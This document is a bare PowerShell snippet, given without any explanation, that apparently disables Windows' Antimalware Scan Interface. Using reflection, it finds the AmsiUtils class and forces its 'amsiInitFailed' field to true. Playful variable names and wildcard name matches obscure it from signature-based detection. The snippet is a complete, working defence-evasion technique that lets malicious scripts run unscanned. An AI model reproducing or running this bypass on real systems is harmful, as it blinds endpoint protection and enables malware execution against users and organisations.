$apple=[Ref].Assembly.GetTypes()
ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}}
$dogwater=$cherry.GetFields('NonPublic,Static')
ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}}
$foxhole.SetValue($null,$true)
